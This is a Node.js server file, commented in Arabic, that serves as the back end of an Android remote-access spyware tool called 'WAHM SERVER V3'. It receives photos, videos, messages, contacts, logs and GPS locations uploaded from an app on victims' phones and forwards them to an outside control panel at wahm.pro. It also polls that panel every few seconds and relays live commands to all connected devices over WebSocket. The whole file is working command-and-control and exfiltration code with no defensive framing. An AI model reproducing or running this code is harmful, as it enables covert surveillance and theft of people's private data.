const express = require('express');
const webSocket = require('ws');
const http = require('http');
const uuid4 = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const FormData = require('form-data');

// --- إعدادات واهم الشخصية ---
// الرابط المباشر لملف التحكم في استضافتك
const PANEL_URL = 'https://wahm.pro/bot/control.php'; 

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });

// إعداد التخزين المؤقت للملفات في الذاكرة قبل إرسالها للوحة
const upload = multer({ 
    storage: multer.memoryStorage(),
    limits: { fileSize: 50 * 1024 * 1024 } // حد أقصى 50 ميجابايت للملف
});

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

/**
 * دالة إرسال البيانات إلى لوحة التحكم PHP
 * تقوم برفع الملفات أو إرسال النصوص عبر POST
 */
async function sendToPanel(data, isFile = false) {
    try {
        const config = {
            maxContentLength: Infinity,
            maxBodyLength: Infinity,
            headers: { 'model': data.model }
        };

        if (isFile) {
            const form = new FormData();
            // الـ APK يرسل الملف تحت مسمى 'file'
            form.append('file', data.buffer, { 
                filename: data.name || 'capture.jpg',
                contentType: data.mimetype || 'image/jpeg'
            });
            form.append('model', data.model);
            
            console.log(`[FILE] Sending to panel from: ${data.model}`);
            await axios.post(PANEL_URL, form, { 
                ...config,
                headers: { ...config.headers, ...form.getHeaders() } 
            });
        } else {
            const params = new URLSearchParams();
            params.append('model', data.model);
            params.append('text', data.text);
            
            console.log(`[TEXT] Sending to panel from: ${data.model}`);
            await axios.post(PANEL_URL, params, config);
        }
        console.log("✅ Data forwarded successfully to wahm.pro");
    } catch (e) {
        console.error("❌ Error forwarding data:", e.message);
    }
}

app.get('/', (req, res) => {
    res.send('<h1 align="center">WAHM SERVER V3 - ACTIVE</h1>');
});

// استقبال الصور/الفيديو من التطبيق
app.post("/uploadFile", upload.single('file'), async (req, res) => {
    const model = req.headers.model || "Unknown_Device";
    if (req.file) {
        await sendToPanel({ 
            buffer: req.file.buffer, 
            name: req.file.originalname, 
            mimetype: req.file.mimetype,
            model: model 
        }, true);
    }
    res.send('OK');
});

// استقبال الرسائل/جهات الاتصال/السجلات من التطبيق
app.post("/uploadText", async (req, res) => {
    const model = req.headers.model || "Unknown_Device";
    const text = req.body['text'];
    if (text) {
        await sendToPanel({ model: model, text: text });
    }
    res.send('OK');
});

// استقبال الموقع الجغرافي من التطبيق
app.post("/uploadLocation", async (req, res) => {
    const model = req.headers.model || "Unknown_Device";
    const loc = `Location: Lat ${req.body['lat']}, Lon ${req.body['lon']}`;
    await sendToPanel({ model: model, text: loc });
    res.send('OK');
});

// إدارة اتصالات WebSocket للأوامر الحية
appSocket.on('connection', (ws, req) => {
    const model = req.headers.model || "New Device";
    ws.isAlive = true;
    console.log(`📱 Device Connected: ${model}`);

    ws.on('pong', () => { ws.isAlive = true; });
    
    ws.on('close', () => {
        console.log(`🚫 Device Disconnected: ${model}`);
    });
});

// فحص الأوامر الجديدة من لوحة PHP كل 3 ثوانٍ وتمريرها للجهاز
setInterval(async () => {
    try {
        const response = await axios.get(`${PANEL_URL}?get_cmd=1`);
        const cmd = response.data.trim();
        
        if (cmd && cmd !== "OK" && cmd !== "") {
            console.log(`🚀 Sending Command: ${cmd}`);
            appSocket.clients.forEach(client => {
                if (client.readyState === webSocket.OPEN) {
                    client.send(cmd);
                }
            });
        }
    } catch (e) {
        // فشل في جلب الأوامر (تجاهل)
    }
}, 3000);

// التأكد من بقاء اتصال الأجهزة حياً
setInterval(() => {
    appSocket.clients.forEach(ws => {
        if (!ws.isAlive) return ws.terminate();
        ws.isAlive = false;
        ws.ping();
    });
}, 30000);

const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

